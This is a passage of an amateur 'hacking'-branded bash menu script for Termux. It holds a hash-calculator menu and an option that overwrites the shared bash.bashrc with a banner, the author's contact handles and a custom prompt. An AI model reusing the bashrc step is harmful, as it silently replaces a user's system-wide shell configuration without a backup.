echo "bash ../usr/etc/bash.bashrc" >> bash.bashrc
echo "fi" >> bash.bashrc
cd
cd MRKING
bash MRKING.sh
fi
if [ $sleep = 2 ]
then
cd
cd ../usr/etc
echo "green='\e[1;32m'" > bash.bashrc
echo "cyan='\e[1;36m'" >> bash.bashrc
echo "red='\e[1;31m'" >> bash.bashrc
echo "blue='\e[1;34m'" >> bash.bashrc
echo "clear" >> bash.bashrc
echo 'echo' >> bash.bashrc
echo 'echo -e $red      "FB: KING.HACKING.SY       TELEGRAM: HACKEER1        INSTA: KING1HACKING"' >> bash.bashrc
echo 'toilet " MR.KING" | lolcat' >> bash.bashrc
echo 'echo""' >> bash.bashrc
echo 'echo -e $green"                    <<<$red The Script By: KiNg-HaCkInG $green>>>"' >> bash.bashrc
echo 'echo' >> bash.bashrc
echo 'PS1="\[\033[01;32m\]KING=>\[\033[01;36m\] "' >> bash.bashrc
clear
echo
echo
toilet "DONE.."
sleep 2
cd
cd MRKING
bash MRKING.sh
fi
if [ $sleep = 0 ]
then
bash MRKING.sh
fi
fi
########################
if [ $name = 7 ]
then
clear
figlet -f slant "HASH-KING" | lolcat
echo -e $red "               @Code By: "$green"KiNg-HaCkInG"
echo -e $red "               WhatsApp: "$green"+963937376653"
echo -e $red "               Facebook: "$green"KING.HACKING.SY"
echo -e $red "               Tweter  : "$green"KiNg-HaCkInG-Sy"
echo -e $red "               Telegram: "$green"HACKEER1"
echo
echo
echo -e $red "1-"$green"MD5"
echo
echo -e $red "2-"$green"sha1"
echo
echo -e $red "3-"$green"sha224"
echo
echo -e $red "4-"$green"sha256"
echo
echo -e $red "5-"$green"sha512"
echo
echo -e $red "6-"$green"sha384"
echo
echo -e $red "0-"$green"BACK"
echo ""
echo -e $green
read -p "Enter The Number: " hash
echo ""
if [ $hash = 0 ]
then
clear
bash MRKING.sh
fi
if [ $hash = 1 ]
then
echo -e $green
read -p "Enter the text that you want: " text
echo ""
echo -e $red "The Hash is:" $green
echo "$text" | md5sum
echo ""
echo -e $blue "Prease The Enter To Back"
read enter
bash MRKING.sh
fi
if [ $hash = 2 ]
then
echo -e $green
read -p "Enter the text that you want: " text
echo ""
echo -e $red "The Hash is:" $green
echo "$text" | sha1sum
echo
echo -e $blue "Prease The Enter To Back"
read enter
bash MRKING.sh
fi
if [ $hash = 3 ]
then
echo -e $green
read -p "Enter the text that you want: " text
echo ""
echo -e $red "The Hash is:" $green
echo "$text" | sha224sum
echo
echo -e $blue "Prease The Enter To Back"
read enter
bash MRKING.sh
fi
if [ $hash = 4 ]
then
echo -e $green
read -p "Enter the text that you want: " text
echo ""
echo -e $red "The Hash is:" $green
echo "$text" | sha256sum
echo
echo -e $blue "Prease The Enter To Back"
read enter
bash MRKING.sh
fi
if [ $hash = 5 ]
then
echo -e $green
read -p "Enter the text that you want: " text
echo ""
echo -e $red "The Hash is:" $green
echo "$text" | sha512sum
echo
echo -e $blue "Prease The Enter To Back"
read enter
bash MRKING.sh
fi
if [ $hash = 6 ]
then
echo -e $green
read -p "Enter the text that you want: " text
echo ""
echo -e $red "The Hash is:" $green
echo "$text" | sha384sum
echo
echo -e $blue "Prease The Enter To Back"
read enter
bash MRKING.sh
fi
else
clear
bash MRKING.sh
fi
#####################
